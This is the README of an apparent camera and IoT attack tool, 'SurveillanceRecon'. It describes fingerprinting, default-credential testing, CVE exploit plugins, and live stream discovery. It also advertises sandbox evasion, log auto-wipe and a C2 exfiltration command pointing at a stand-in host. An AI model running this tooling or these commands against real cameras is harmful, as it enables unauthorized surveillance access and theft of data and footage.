# SurveillanceRecon

> Advanced CCTV/IoT Security Assessment Framework for Authorized Penetration Testing

[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
[![License](https://img.shields.io/badge/license-Educational%2FResearch-red.svg)](LICENSE)
[![Version](https://img.shields.io/badge/version-1.0.0-green.svg)](https://github.com/joyelkhan/surveillance_recon)

## ⚠️ Legal Disclaimer

**FOR AUTHORIZED SECURITY TESTING ONLY.** Unauthorized access is illegal. Use only on systems you own or have explicit written permission to test.

---

## 🚀 Quick Start

```bash
# Clone and install
git clone https://github.com/joyelkhan/surveillance_recon.git
cd surveillance_recon
pip install -r requirements.txt

# Run scan
python -m surveillance_recon 192.168.1.100
```

## ✨ Features

- 🔍 **Multi-Vendor Fingerprinting** - Hikvision, Dahua, Axis, Sony, Bosch, CP Plus, Panasonic, Vivotek
- 🎯 **Smart Port Scanning** - Adaptive vendor-specific port selection
- 🔑 **Credential Testing** - 100+ default credentials with intelligent mutations
- 📹 **Stream Validation** - RTSP/HTTP/ONVIF live stream detection
- 🛡️ **CVE Mapping** - 36+ vulnerabilities with exploit plugins
- 🔐 **OpSec Features** - Encrypted logs, sandbox evasion, C2 exfiltration

## 📖 Usage

### Basic Commands

```bash
# Single target
python -m surveillance_recon 192.168.1.100

# IP range
python -m surveillance_recon 192.168.1.10-20

# Fast scan (high-risk ports only)
python -m surveillance_recon 192.168.1.100 --fast

# Brand-specific
python -m surveillance_recon 192.168.1.100 --brand hikvision
```

### Advanced Options

```bash
# Custom ports
python -m surveillance_recon 192.168.1.100 -p 80,443,554,8080

# Quiet mode
python -m surveillance_recon 192.168.1.100 --quiet

# With C2 exfiltration
python -m surveillance_recon 192.168.1.100 --c2-https https://your-c2.com
```

### Python API

```python
import surveillance_recon

# Quick scan
report = surveillance_recon.scan("192.168.1.100", brand="hikvision")

# Advanced
from surveillance_recon import ReconEngine
engine = ReconEngine(target_ip="192.168.1.100")
report = engine.run_full_recon()
```

## 🎯 Supported Vendors

| Vendor | Fingerprinting | Credentials | CVEs | Exploits |
|--------|---------------|-------------|------|----------|
| Hikvision | ✅ | ✅ | 3+ | ✅ |
| Dahua | ✅ | ✅ | 3+ | ✅ |
| CP Plus | ✅ | ✅ | - | - |
| Axis | ✅ | ✅ | 2+ | - |
| Sony | ✅ | ✅ | 1+ | - |
| Others | ✅ | ✅ | - | - |

## 📊 Output Example

```json
{
  "target_ip": "192.168.1.100",
  "camera_candidates": [{
    "brand": "hikvision",
    "model": "DS-2CD2142FWD",
    "vulnerabilities": ["CVE-2021-36260"],
    "is_exploit_ready": true
  }],
  "auth_results": {
    "credentials": {"username": "admin", "password": "12345"}
  },
  "streams": [{
    "protocol": "RTSP",
    "url": "rtsp://192.168.1.100:554/Streaming/Channels/101",
    "is_live": true
  }]
}
```

## 🛡️ Security Features

- **AES-256 Encrypted Logs** - All output encrypted by default
- **Auto-Wipe** - Logs deleted on exit (disable with `--no-wipe`)
- **Sandbox Evasion** - Detects VMs/analysis environments
- **Stealth Mode** - Mimics legitimate traffic patterns

## 📦 Installation

### Requirements
- Python 3.8+
- VLC or FFmpeg (optional, for stream validation)

### Install
```bash
pip install -r requirements.txt
```

### Optional: Install as Package
```bash
pip install -e .
surveillance-recon 192.168.1.100  # Run from anywhere
```

## 🤝 Contributing

Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

## 📜 License

Educational/Research Use Only - See [LICENSE](LICENSE)

## 🔗 Links

- **GitHub**: https://github.com/joyelkhan/surveillance_recon
- **Issues**: https://github.com/joyelkhan/surveillance_recon/issues
- **Documentation**: [INSTALL.md](INSTALL.md) | [PROJECT_INFO.md](PROJECT_INFO.md)

---

**Built by SecOps Research Team** | [Report Issues](https://github.com/joyelkhan/surveillance_recon/issues)

